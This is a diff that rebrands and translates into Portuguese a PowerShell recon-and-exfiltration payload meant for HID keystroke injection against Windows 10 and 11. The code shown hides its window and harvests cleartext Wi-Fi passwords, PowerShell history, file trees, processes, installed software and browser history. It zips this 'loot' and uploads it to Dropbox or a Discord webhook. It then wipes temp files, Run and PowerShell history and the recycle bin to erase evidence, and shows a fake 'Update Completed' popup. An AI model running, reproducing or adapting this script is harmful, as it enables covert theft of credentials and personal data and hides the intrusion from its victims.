@@ -1,35 +1,43 @@
-############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _` | | '_ ` _ \   _  | |  / _` | | |/ /  / _ \  | '_ \  | | | |#              `Y8888888Y'                    #           
-# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               `Y888Y'                       #
-# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 `Y'                         #
-# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   (`\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*(`     `) ~ \   Hobo          #                        
-#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
-############################################################################################################################################################
-                                                                                                                                                                                                                                               
-<#
-.SYNOPSIS
-	This is an advanced recon of a target PC and exfiltration of that data.
-.DESCRIPTION 
-	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
-	All of the gather information is formatted neatly and output to a file.
-	That file is then exfiltrated to cloud storage via Dropbox.
-.Link
-      https://developers.dropbox.com/oauth-guide	    # Guide for setting up your Dropbox for uploads
-      https://www.youtube.com/watch?v=Zs-1j42ySNU           # My youtube tutorial on Discord Uploads 
-      https://www.youtube.com/watch?v=VPU7dFzpQrM           # My youtube tutorial on Dropbox Uploads
-#>
-
+############################################################################################################################################################ 
+#                                                                                                                                                          #
+#   Nome       : The Blast                                                                                                                                 #
+#   Autor      : Clank                                                                                                                                     #
+#   Categoria  : Recon                                                                                                                                     #
+#   Alvo       : Windows 10,11                                                                                                                             #
+#                                                                                                                                                          #
+#                                     |  ######             ###    ##   ##             ####   ####       ###    ##   ##  ### ###  |                        #
+#                                     |    ##              ## ##   ### ###            ##  ##   ##       ## ##   ###  ##   ## ##   |                        #
+#                                     |    ##             ##   ##  #######           ##        ##      ##   ##  #### ##   ####    |                        #
+#                                     |    ##             ##   ##  ## # ##           ##        ##      ##   ##  #######   ###     |                        #
+#                                     |    ##             #######  ##   ##           ##        ##      #######  ## ####   ####    |                        #
+#                                     |    ##             ##   ##  ##   ##            ##  ##   ##  ##  ##   ##  ##  ###   ## ##   |                        #
+#                                     |  ######           ##   ##  ### ###             ####   #######  ##   ##  ##   ##  ### ###  |                        #
+#                                                                                                                                                          #
+#                                                              Anything can be hacked... or anyone                                                         #                                                 #
+#                                                                                                                                                          # 
+#__________________________________________________________________________________________________________________________________________________________#
+#                                                                                                                                                          #                                                                                 
+#   Descricao:                                                                                                          |   ███████▀▀▀░░░░░░░▀▀▀███████   |#
+#        Este script permite obter detalhes sobre o PC alvo.                                                            |   ████▀░░░░░░░░░░░░░░░░░▀████   |#
+#        Detalhes como: palavra passe de redes wi-fi, especificacoes do computador, todos os processos em execucao...   |   ███│░░░░░░░░░░░░░░░░░░░│███   |#
+#        Todas as informacoes adquiridas serao formatadas de maneira organizada e enviadas para um arquivo.             |   ██▌│░░░░░░░░░░░░░░░░░░░│▐██   |#
+#        Esse arquivo e enviado para um servidor discord.                                                               |   ██░└┐░░░░░░░░░░░░░░░░░┌┘░██   |#
+#                                                                                                                       |   ██░░└┐░░░░░░░░░░░░░░░┌┘░░██   |#
+#   Sobre mim:                                                                                                          |   ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██   |#
+#                                                                                                                       |   ██▌░│██████▌░░░▐██████│░▐██   |#
+#                                                                                                                       |   ███░│▐███▀▀░░▄░░▀▀███▌│░███   |#
+#                                                                                                                       |   ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██   |#
+#                                                                                                                       |   ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██   |#
+#                                                                                                                       |   ████▄─┘██▌░░░░░░░▐██└─▄████   |#
+#                                                                                                                       |   █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████   |#
+#                                                                                                                       |   ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████   |#
+#                                                                                                                       |   █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████   |#
+#                                                                                                                       |   ███████▄░░░░░░░░░░░▄███████   |#
+#                                                                                                                       |   ██████████▄▄▄▄▄▄▄██████████   |#
+#                                                                                                                                                          #
+#  Gitub: ClankPT                                                                                                                                          #
+#  Discord: .clank_                                                                                                                                        #
+#  Steam: Clank.PT                                                                                                                                         #                                                                                                                                 #
 ############################################################################################################################################################
 
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
@@ -37,7 +45,7 @@ add-type -name win -member $i -namespace native;
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
 
 
-# MAKE LOOT FOLDER, FILE, and ZIP 
+# Faz uma Pasta chamada LOOT, um ficheiro em txt, e um ZIP 
 
 $FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
 
@@ -49,7 +57,7 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
-# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
+# Inserir os tokens pedidos abaixo "dropbox ou discord". 
 
 #$db = ""
 
@@ -57,10 +65,10 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
-# Recon all User Directories
+# Reconhecimento de todos os diretorios do utilizador
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
-# Powershell history
+# Historico da PowerShell
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
 ############################################################################################################################################################
@@ -182,7 +190,7 @@ $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
 
 ############################################################################################################################################################
 
-# Get nearby wifi networks
+# Apanha as credenciais de rede wireless
 
 try
 {
@@ -195,9 +203,9 @@ $NearbyWifi="No nearby wifi networks detected"
 
 ############################################################################################################################################################
 
-# Get info about pc
+# Apanha informacao sobre o PC
 
-# Get IP / Network Info
+# Apanha o IP / Informacao da Rede
 
 try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
 catch{$computerPubIP="Error getting Public IP"}
@@ -207,7 +215,7 @@ catch{$localIP = "Error getting local IP"}
 
 $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
 
-# Check RDP
+# Verifica o RDP
 
 if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
 	$RDP = "RDP is Enabled" 
@@ -217,7 +225,7 @@ if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").
 
 ############################################################################################################################################################
 
-#Get System Info
+#Apanha informacoes do sistema
 $computerSystem = Get-CimInstance CIM_ComputerSystem
 
 $computerName = $computerSystem.Name
@@ -252,7 +260,7 @@ $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object
 
 ############################################################################################################################################################
 
-# Get HDDs
+# Apanha informacoes dos discos
 $driveType = @{
    2="Removable disk "
    3="Fixed local disk "
@@ -265,7 +273,7 @@ $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.
 
 ############################################################################################################################################################
 
-# Get Network Interfaces
+# Apanha a interface da rede
 $NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
@@ -275,7 +283,7 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 # process first
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250
 
-# Get Listeners / ActiveTcpConnections
+# Cria uma lista dos servicos
 $listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
 $listener = $listener | foreach-object {
     $listenerItem = $_
@@ -290,43 +298,43 @@ $listener = $listener | foreach-object {
     }
 } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
 
-# service
+# Servicos
 $service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250
 
-# installed software (get uninstaller)
+#  software Instalado (Apanha o uninstaller)
 $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250
 
 # drivers
 $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250
 
-# videocard
+# Placa Grafica
 $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250
 
 
 ############################################################################################################################################################
 
-# OUTPUTS RESULTS TO LOOT FILE
+# Visao Final
 
 $output = @"
 
-############################################################################################################################################################                      
-#                                  |  ___                           _           _              _             #              ,d88b.d88b                     #                                 
-# Title        : ADV-Recon         | |_ _|   __ _   _ __ ___       | |   __ _  | | __   ___   | |__    _   _ #              88888888888                    #           
-# Author       : I am Jakoby       |  | |   / _' | | '_ ' _ \   _  | |  / _' | | |/ /  / _ \  | '_ \  | | | |#              'Y8888888Y'                    #           
-# Version      : 2.0               |  | |  | (_| | | | | | | | | |_| | | (_| | |   <  | (_) | | |_) | | |_| |#               'Y888Y'                       #
-# Category     : Recon             | |___|  \__,_| |_| |_| |_|  \___/   \__,_| |_|\_\  \___/  |_.__/   \__, |#                 'Y'                         #
-# Target       : Windows 10,11     |                                                                   |___/ #           /\/|_      __/\\                  #     
-# Mode         : HID               |                                                           |\__/,|   ('\ #          /    -\    /-   ~\                 #             
-#                                  |  My crime is that of curiosity                            |_ _  |.--.) )#          \    = Y =T_ =   /                 #      
-#                                  |  and yea curiosity killed the cat                         ( T   )     / #   Luther  )==*('     ') ~ \   Hobo          #                        
-#                                  |  but satisfaction brought him back                       (((^_(((/(((_/ #          /     \     /     \                #    
-#__________________________________|_________________________________________________________________________#          |     |     ) ~   (                #
-#  tiktok.com/@i_am_jakoby                                                                                   #         /       \   /     ~ \               #
-#  github.com/I-Am-Jakoby                                                                                    #         \       /   \~     ~/               #         
-#  twitter.com/I_Am_Jakoby                                                                                   #   /\_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_#                     
-#  instagram.com/i_am_jakoby                                                                                 #  |  |  |  | ) ) |  |  | ((  |  |  |  |  |  |#              
-#  youtube.com/c/IamJakoby                                                                                   #  |  |  |  |( (  |  |  |  \\ |  |  |  |  |  |#
-############################################################################################################################################################
+############################################################################################################################################################ 
+#                                                                                                                                                          #
+#   Nome       : The Blast                                                                                                                                 #
+#   Autor      : Clank                                                                                                                                     #
+#   Categoria  : Recon                                                                                                                                     #
+#   Alvo       : Windows 10,11                                                                                                                             #
+#                                                                                                                                                          #
+#                                     |  ######             ###    ##   ##             ####   ####       ###    ##   ##  ### ###  |                        #
+#                                     |    ##              ## ##   ### ###            ##  ##   ##       ## ##   ###  ##   ## ##   |                        #
+#                                     |    ##             ##   ##  #######           ##        ##      ##   ##  #### ##   ####    |                        #
+#                                     |    ##             ##   ##  ## # ##           ##        ##      ##   ##  #######   ###     |                        #
+#                                     |    ##             #######  ##   ##           ##        ##      #######  ## ####   ####    |                        #
+#                                     |    ##             ##   ##  ##   ##            ##  ##   ##  ##  ##   ##  ##  ###   ## ##   |                        #
+#                                     |  ######           ##   ##  ### ###             ####   #######  ##   ##  ##   ##  ### ###  |                        #
+#                                                                                                                                                          #
+#                                                              Anything can be hacked... or anyone                                                         #                                                 #
+#                                                                                                                                                          # 
+#__________________________________________________________________________________________________________________________________________________________#
 
 
 Full Name: $fullName
@@ -517,7 +525,7 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
-# Upload output file to dropbox
+# Upload para a Dropbox
 
 function dropbox {
 $TargetFilePath="/$ZIP"
@@ -566,28 +574,28 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
 <#
 .NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
+	Agora esta parte e para remover qualquer evidencia que prove que o script correu
 #>
 
-# Delete contents of Temp folder 
+# Delete nos ficheiros da pasta Temp
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
-# Delete run box history
+# Delete no historico do run box 
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
-# Delete powershell history
+# Delete no historico da powershell
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
-# Deletes contents of recycle bin
+# Esvazia a Reciclagem
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 		
 ############################################################################################################################################################
 
-# Popup message to signal the payload is done
+# sinal que acabou um Pop-up
 
 $done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
